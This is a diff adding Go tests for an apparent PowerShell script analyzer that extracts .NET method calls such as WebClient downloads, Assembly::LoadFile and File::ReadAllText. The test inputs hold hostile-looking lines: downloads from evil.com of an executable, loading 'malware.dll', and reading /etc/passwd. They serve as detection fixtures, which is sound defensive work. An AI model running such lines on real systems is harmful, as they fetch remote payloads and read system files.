@@ -1555,3 +1555,220 @@ func FuzzExtractor_PSCommand(f *testing.F) {
 		}
 	})
 }
+
+// TestPSWorker_NewObjectNamedTypeName verifies that New-Object with the named
+// parameter form (-TypeName TypeName) is detected and its instance method calls
+// are extracted correctly.
+//
+// BUG 3: The ps_bootstrap_dotnet.ps1 instance-method walker only handled the
+// positional form (New-Object System.Net.WebClient) and missed the named-parameter
+// form (New-Object -TypeName System.Net.WebClient). After the fix, both forms
+// must produce method call records with the correct command name and args.
+//
+// BUG: fails before fix — add //nolint:unused if needed
+func TestPSWorker_NewObjectNamedTypeName(t *testing.T) {
+	pwshPath, ok := FindPwsh()
+	if !ok {
+		t.Skip("pwsh.exe / powershell.exe not found")
+	}
+	w, err := newPwshWorker(pwshPath)
+	if err != nil {
+		t.Fatalf("newPwshWorker: %v", err)
+	}
+	defer w.stop()
+
+	t.Run("variable form: $wc = New-Object -TypeName ... ; $wc.Method()", func(t *testing.T) {
+		// BUG: fails before fix — named -TypeName parameter not recognised by instance-method walker.
+		const script = `$wc = New-Object -TypeName System.Net.WebClient
+$wc.DownloadFile("http://evil.com/x.exe", "C:\tmp\x.exe")`
+		resp, err := w.parse(script)
+		if err != nil {
+			t.Fatalf("parse: %v", err)
+		}
+		if len(resp.ParseErrors) > 0 {
+			t.Fatalf("unexpected parse errors: %v", resp.ParseErrors)
+		}
+		const wantName = "system.net.webclient::downloadfile"
+		var found bool
+		for _, c := range resp.Commands {
+			if c.Name == wantName {
+				found = true
+				if !slices.Contains(c.Args, "http://evil.com/x.exe") {
+					t.Errorf("expected arg %q in %v", "http://evil.com/x.exe", c.Args)
+				}
+				if !slices.Contains(c.Args, `C:\tmp\x.exe`) {
+					t.Errorf("expected arg %q in %v", `C:\tmp\x.exe`, c.Args)
+				}
+			}
+		}
+		if !found {
+			t.Errorf("expected command %q; got: %+v", wantName, resp.Commands)
+		}
+	})
+
+	t.Run("inline form: (New-Object -TypeName ...).Method()", func(t *testing.T) {
+		// BUG: fails before fix — named -TypeName parameter not recognised by instance-method walker.
+		const script = `(New-Object -TypeName System.Net.WebClient).DownloadString("http://evil.com")`
+		resp, err := w.parse(script)
+		if err != nil {
+			t.Fatalf("parse: %v", err)
+		}
+		if len(resp.ParseErrors) > 0 {
+			t.Fatalf("unexpected parse errors: %v", resp.ParseErrors)
+		}
+		const wantName = "system.net.webclient::downloadstring"
+		var found bool
+		for _, c := range resp.Commands {
+			if c.Name == wantName {
+				found = true
+				if !slices.Contains(c.Args, "http://evil.com") {
+					t.Errorf("expected arg %q in %v", "http://evil.com", c.Args)
+				}
+			}
+		}
+		if !found {
+			t.Errorf("expected command %q; got: %+v", wantName, resp.Commands)
+		}
+	})
+}
+
+// TestPSWorker_AssemblyLoad verifies that .NET reflection Assembly::Load*
+// static method calls are extracted by the pwsh worker.
+//
+// BUG 4: Several .NET APIs were absent from the commandDB. This test verifies
+// that the worker at least emits the correct command name so that any DB entry
+// added later will be matched.
+func TestPSWorker_AssemblyLoad(t *testing.T) {
+	pwshPath, ok := FindPwsh()
+	if !ok {
+		t.Skip("pwsh.exe / powershell.exe not found")
+	}
+	w, err := newPwshWorker(pwshPath)
+	if err != nil {
+		t.Fatalf("newPwshWorker: %v", err)
+	}
+	defer w.stop()
+
+	tests := []struct {
+		name     string
+		script   string
+		wantName string
+		wantArg  string
+	}{
+		{
+			name:     "Assembly::LoadFile",
+			script:   `[System.Reflection.Assembly]::LoadFile("C:\malware.dll")`,
+			wantName: "system.reflection.assembly::loadfile",
+			wantArg:  `C:\malware.dll`,
+		},
+		{
+			name:     "Assembly::LoadFrom",
+			script:   `[System.Reflection.Assembly]::LoadFrom("C:\malware.dll")`,
+			wantName: "system.reflection.assembly::loadfrom",
+			wantArg:  `C:\malware.dll`,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			resp, err := w.parse(tt.script)
+			if err != nil {
+				t.Fatalf("parse: %v", err)
+			}
+			if len(resp.ParseErrors) > 0 {
+				t.Fatalf("unexpected parse errors: %v", resp.ParseErrors)
+			}
+			// The worker must at minimum emit the command name correctly.
+			// BUG: not in commandDB yet — the worker extracts the name but the DB
+			// may not have an entry for it; add one to get Operation detection.
+			var found bool
+			for _, c := range resp.Commands {
+				if c.Name == tt.wantName {
+					found = true
+					if !slices.Contains(c.Args, tt.wantArg) {
+						t.Errorf("expected arg %q in %v", tt.wantArg, c.Args)
+					}
+				}
+			}
+			if !found {
+				t.Errorf("expected command %q with arg %q; got: %+v", tt.wantName, tt.wantArg, resp.Commands)
+			}
+		})
+	}
+}
+
+// TestPSWorker_StaticMethod_HasSubst verifies that static method calls whose
+// arguments include a variable or non-literal expression set has_subst=true, and
+// that calls with only literal string arguments leave has_subst=false.
+//
+// BUG 10: The static-method walker in ps_bootstrap_dotnet.ps1 unconditionally
+// emitted has_subst=$false, so variable arguments to [Type]::Method($var) were
+// never flagged as substituted. After the fix, has_subst must reflect whether
+// any argument is non-literal.
+func TestPSWorker_StaticMethod_HasSubst(t *testing.T) {
+	pwshPath, ok := FindPwsh()
+	if !ok {
+		t.Skip("pwsh.exe / powershell.exe not found")
+	}
+	w, err := newPwshWorker(pwshPath)
+	if err != nil {
+		t.Fatalf("newPwshWorker: %v", err)
+	}
+	defer w.stop()
+
+	t.Run("variable arg sets has_subst=true", func(t *testing.T) {
+		// BUG 10: fails before fix — has_subst was always false for static methods.
+		// $path is assigned by a cmdlet call (not a string literal), so any
+		// downstream static method call that uses $path must set has_subst=true.
+		const script = `$path = Get-ClipboardText; [System.IO.File]::ReadAllText($path)`
+		resp, err := w.parse(script)
+		if err != nil {
+			t.Fatalf("parse: %v", err)
+		}
+		if len(resp.ParseErrors) > 0 {
+			t.Fatalf("unexpected parse errors: %v", resp.ParseErrors)
+		}
+		const wantName = "system.io.file::readalltext"
+		var found bool
+		for _, c := range resp.Commands {
+			if c.Name == wantName {
+				found = true
+				if !c.HasSubst {
+					// BUG 10: has_subst is always false before the fix.
+					t.Errorf("has_subst=false, want true for %q (variable arg should set has_subst)", script)
+				}
+			}
+		}
+		if !found {
+			t.Errorf("expected command %q; got: %+v", wantName, resp.Commands)
+		}
+	})
+
+	t.Run("literal arg keeps has_subst=false", func(t *testing.T) {
+		const script = `[System.IO.File]::ReadAllText("/etc/passwd")`
+		resp, err := w.parse(script)
+		if err != nil {
+			t.Fatalf("parse: %v", err)
+		}
+		if len(resp.ParseErrors) > 0 {
+			t.Fatalf("unexpected parse errors: %v", resp.ParseErrors)
+		}
+		const wantName = "system.io.file::readalltext"
+		const wantArg = "/etc/passwd"
+		var found bool
+		for _, c := range resp.Commands {
+			if c.Name == wantName {
+				found = true
+				if c.HasSubst {
+					t.Errorf("has_subst=true, want false for literal-arg static method call")
+				}
+				if !slices.Contains(c.Args, wantArg) {
+					t.Errorf("expected arg %q in %v", wantArg, c.Args)
+				}
+			}
+		}
+		if !found {
+			t.Errorf("expected command %q with arg %q; got: %+v", wantName, wantArg, resp.Commands)
+		}
+	})
+}
